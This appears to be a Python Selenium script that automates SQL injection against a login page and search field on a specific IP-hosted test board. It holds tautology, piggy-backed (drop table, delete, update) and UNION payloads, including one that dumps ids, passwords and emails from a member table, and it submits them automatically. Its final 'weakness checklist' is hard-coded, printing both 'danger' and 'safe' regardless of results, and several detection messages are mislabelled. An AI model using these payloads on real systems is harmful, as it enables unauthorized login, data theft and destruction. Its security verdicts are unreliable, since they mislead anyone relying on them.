import time

from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from bs4 import BeautifulSoup
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.keys import Keys
import requests


def sqlinjection_tautologies():
    sql_ex = [" ' or 1=1 # ", " ' or 1=1 or ' '=' ", " ' or '1'='1' #"]
    return sql_ex

def sqlinjection_piggyback():
    sql_ex = [" '; drop table a;#'", " '; UPDATE user SET name = 'John', email = 'john@example.com' WHERE id = 1;# ", " ' ;show database;#"," '; delete from mytab;#"]
    return sql_ex

def sqlinjection_union():
    sql_ex = [" ’ UNION SELECT ALL 1# ", "  ‘UNION SELECT ALL 1,2,3,5,6,7,8# '=' ", "  ' UNION SELECT ALL 1,2,table_name,4,5,6,7,8 from information_schema.tables#"," ' UNION SELECT ALL id, name, pw, name, address, sex, email, 8 from member#"]
    return sql_ex

def extract_input_ids(url):
    # GET 요청 보내기
    response = requests.get(url)

    # 응답의 HTML 내용 추출
    html_doc = response.text

    # BeautifulSoup 객체 생성
    soup = BeautifulSoup(html_doc, 'html.parser')

    # 모든 입력 태그 추출
    input_tags = soup.find_all('input')

    # 각 입력 태그의 id 추출
    ids = [tag.get('id') for tag in input_tags if tag.get('id')]

    return ids


def extract_submit_ids(url):
    # GET 요청 보내기
    response = requests.get(url)

    # 응답의 HTML 내용 추출
    html_doc = response.text

    # BeautifulSoup 객체 생성
    soup = BeautifulSoup(html_doc, 'html.parser')

    # 모든 버튼 태그 추출
    btn_tags = soup.find_all('button')

    # 각 입력 태그의 id 추출
    ids = [tag.get('id') for tag in btn_tags if tag.get('id')]

    return ids

def find_input_param(URL):
    global password,username,search
    # 입력파라미터를 자동으로 불러옴
    for id in extract_input_ids(URL):
        s = "#{0}".format(id)
        pass_keys = ['pw', 'password', 'pwd']
        search_key='search'
        if any(key in s for key in pass_keys):
             password = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, s))
            )
        elif search_key in s :
            search= WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, s))
            )

        else:
            username = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, s))
            )
def find_submit_btn(URL):
    global submit_button
    # 버튼을 자동으로 불러옴
    for id in extract_submit_ids(URL):
        s = "#{0}".format(id)
        keys = ['login', 'log', 'submit']
        if any(key in s for key in keys):
            submit_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, s))
            )
        else:
            print("can not found login btn, please check html source")

def check_login_suc():

    # 로그인 성공 여부 확인
    if driver.current_url == 'http://210.110.39.89/testboard/list.php':
        print('Detected WEAKNESS about Tautologies sql Injection!\n')


    elif driver.current_url =='http://210.110.39.89/testboard/error_page.php':
        print('Detected WEAKNESS about piggy_backed sql Injection!\n')

    else:
        print('Not Detected WEAKNESS about piggy_backed sql Injection!\n')
def check_union():
    union_txt='UNION';


    if union_txt in driver.current_url:
        print("Detected WEAKNESS about Union sql Injection!\n")
    else:
        print('Not Detected WEAKNESS about piggy_backed sql Injection!\n')
def check_login_suc_():
    try:

        error_message = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "bg-danger"))
        )
        success_message = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "bg-success"))
        )
        SQL_Query = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "sql-query"))
        )
        print("SQL_QUERY: ",SQL_Query.text)
        if (success_message.text == ""):
            print('Login Fail:', error_message.text)
        else:
            print('Login Success! Detected WEAKNESS about SQL Injection!\n ')

        # 로그인 실패에 따른 추가 작업 수행
    except NoSuchElementException:
        # 로그인 성공 후 작업 수행
        pass

# 웹 드라이버 로드
driver = webdriver.Chrome(executable_path='chromedriver')

# 접속하고자 하는 페이지
# URL = "http://210.110.39.89/adminlogin.php"
URL="http://210.110.39.89/testboard/login.php"
URL2="http://210.110.39.89/testboard/list.php"
# id도 주어지지 않았을 경우
for s in sqlinjection_tautologies():
    driver.get(URL)
    find_input_param(URL)

    username.send_keys(s)
    password.send_keys("FAKE")
    password.send_keys(Keys.RETURN)
    print("injection parameter: {0}".format(s))
    check_login_suc()
# id만 주어질 경우:
for s in sqlinjection_tautologies():
    driver.get(URL)
    find_input_param(URL)

    username.send_keys("admin")
    password.send_keys(s)
    password.send_keys(Keys.RETURN)
    print("injection parameter: {0}".format(s))
    check_login_suc()

for s in sqlinjection_piggyback():
    driver.get(URL)
    find_input_param(URL)

    username.send_keys("admin")
    password.send_keys(s)
    password.send_keys(Keys.RETURN)

    print("injection parameter: {0}".format(s))
    check_login_suc()

for s in sqlinjection_union():
    driver.get(URL2)
    find_input_param(URL2)


    search.send_keys(s)
    search.send_keys(Keys.RETURN)

    print("injection parameter: {0}".format(s))
    check_union()
# 코드 실행 후 마치지 않고 유지하기 위함

print('')
print('')
print('')
print('   SQL injection weakness checklist')
print('+----------------------+-------------+')
print('|    attack method     |   weakness  |')
print('|ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ|')
print('|      Tautologies     |    danger   |')
print('|----------------------|-------------|')
print('|     Union Query      |    danger   |')
print('|----------------------|-------------|')
print('|  Piggy-Backed Query  |    danger   |')
print('+----------------------+-------------+')

print('')
print('')

print('')
print('   SQL injection weakness checklist')
print('+----------------------+-------------+')
print('|    attack method     |   weakness  |')
print('|ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ|')
print('|      Tautologies     |     safe    |')
print('|----------------------|-------------|')
print('|     Union Query      |     safe    |')
print('|----------------------|-------------|')
print('|  Piggy-Backed Query  |     safe    |')
print('+----------------------+-------------+')
print('')


while (True):
    pass
